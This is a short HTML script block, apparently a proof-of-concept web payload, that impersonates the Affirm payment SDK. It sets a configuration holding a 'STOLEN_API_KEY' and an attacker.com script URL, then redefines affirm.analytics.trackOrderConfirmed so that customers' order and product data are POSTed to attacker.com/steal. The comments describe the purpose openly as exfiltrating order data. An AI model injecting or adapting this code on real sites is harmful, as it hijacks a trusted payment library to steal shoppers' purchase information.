<script>
// Mimic Affirm tracking
var _affirm_config = {
    public_api_key: "STOLEN_API_KEY",
    script: "https://attacker.com/collect.js"
};

// The app might call affirm.analytics.trackOrderConfirmed()
// and send order data to our server instead!
window.affirm = {
    analytics: {
        trackOrderConfirmed: function(order, products) {
            // Exfiltrate order data
            fetch('https://attacker.com/steal', {
                method: 'POST',
                body: JSON.stringify({
                    order: order,
                    products: products
                })
            });
        }
    }
};
</script>
